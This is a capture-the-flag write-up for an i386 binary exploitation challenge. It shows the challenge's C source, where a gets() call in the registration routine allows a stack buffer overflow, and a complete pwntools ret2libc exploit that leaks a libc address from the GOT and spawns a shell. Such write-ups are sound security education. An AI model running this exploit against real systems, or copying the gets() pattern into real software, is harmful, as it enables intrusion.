---

title: Backk pcc.nccs.final 2022

author: megachar0x01

date: 2022-08-08

categories: [Pwn, i386, ctf]

---

### Purpose : Get Shell
[![asciicast](https://asciinema.org/a/513325.svg)](https://asciinema.org/a/513325)


Checking binary security measures.

<img src="https://i.imgur.com/q7IGIN9.png" alt="img_1">


Source Code is given. Reading through it we can see the option2 registration function is vulnerable. It uses the gets function which will not see how much value is being fed to it we use it to perform a stack-based buffer overflow.


```c

#include <stdio.h>
#include <string.h>

#define SIZE 64

void banner() {
	printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠤⠶⠶⠶⠶⠶⠶⢀⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠀⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠃⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣇⣠⣴⡶⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀\n");
	printf("⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀\n");
	printf("⠀⣰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀\n");
	printf("⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⢿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄\n");
	printf("⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⢠⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇\n");
	printf("⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⠃⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿\n");
	printf("⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣷⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿\n");
	printf("⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇\n");
	printf("⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁\n");
	printf("⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀\n");
	printf("⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠘⠋⠉⣼⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠃⠀⠀\n");
	printf("⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⢰⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠈⠳⣤⡀⠀⠀⢀⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⠁⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⠂⣾⣿⠃⠀⠀⠀⠀⠀⠀⢀⣀⣠⡴⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡿⠁⠉⠛⠛⠛⠛⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n");
	printf("⠀⠀⠀⠀⠀⠀⠀⠀                   - TheFlash2k⠀⠀\n");
}

void local_flush(void) {
    int c;
    while((c = getchar()) != '\n' && c != EOF);
}

void secure_input(int* var) {
	fflush(stdin);
	scanf("%d", var);
	local_flush();
}

void login() {
	char userName[SIZE];
	printf("\n\nWelcome to the login screen. Enter your username to continue\n>> ");
	fgets(userName, SIZE, stdin);
	if(strcmp(userName, "admin") != 0) {
		printf("Invalid username entered. Try again.\nIf you have recently registered, we are still working on saving credentials :(\n");
		exit(1);
	}
	else {
		printf("Welcome admin. The portal is still underconstruction so i'd suggest that you leave :(\n");
		exit(0);
	}
}

void _register() {
	char userName[SIZE];
	printf("\n\nWelcome to the Registeration screen. Enter your username to add to database\n>> ");
	fgets(userName, SIZE, stdin);

	if(strcmp(userName, "admin") != 0) {
		printf("User already exists. Please try something else\n>> ");
		gets(userName);
	}
	else {
		printf("Successfully registered as admin!\n");
	}
}

void validate() {
	char userName[SIZE];
	printf("\n\nWelcome to the validation screen. Enter your username to check if it exists\n>> ");
	fgets(userName, SIZE, stdin);
	if(strcmp(userName, "admin") != 0) {
		printf("%s doesn't exist. Maybe because we're not keeping track of what exists and what doesn't :(");
		exit(1);
	}
	else {
		printf("%s is a valid user!\n");
		exit(0);
	}
}


int main(int argc, char* argv[]) {


	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	int uChoice;

	banner();

	printf("Welcome to AUCTF Secure Portal. Please choose one of the following:\n");
	printf("1. Login\n");
	printf("2. Register\n");
	printf("3. Validate\n");
	printf("0. Exit\n\n>> ");

	secure_input(&uChoice);

	while(uChoice < 0 || uChoice > 3) {
		printf("Invalid number entered. Try again\n>> ");
		secure_input(&uChoice);
	}

	printf("User entered: %d\n", uChoice);

	switch(uChoice) {
		case 1:
			login();
			break;
		case 2:
			_register();
			break;
		case 3:
			validate();
			break;
		case 0:
			exit(0);
		default:
			break;
	}

	return 0;

}

```

Now it's time to exploit this binary. For that, we will perform ret2libc. For defeating aslr we have to leak the libc function value from got and then use it to get the libc base address afterward all the rest is a piece of cake.

```python
#!/usr/bin/python3
from pwn import *
import struct

def start(argv=[], *a, **kw):
    if args.GDB:  
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        
        return process([exe] + argv, *a, **kw)

exe = './backk'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)
libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False);

def setting_libc(): # Leaking puts addres from got and then transfering execution to main function

    io.sendlineafter(b">>",b"2")
    exe_rop.puts(elf.got.puts)
    exe_rop.main()
    leak =  b"A"*135
    leak += exe_rop.chain()
    io.sendlineafter(b">>",leak)
    io.recvline()
    leak_raw = u32(io.recvline().strip(b">>")[1:5])
    libc.address =  leak_raw - libc.symbols['puts'] 
    
def shell(): # exploiting same vuln to get shell
    libc_rop.system(next(libc.search(b"/bin/sh")))
    libc_rop.exit()
    payload =  b"A"*135
    payload +=libc_rop.chain()
    io.sendlineafter(b">>",b"2")
    io.sendlineafter(b">>",payload)


io = start()
setting_libc()
libc_rop = ROP(libc,checksec=False)
shell()
io.interactive()

```


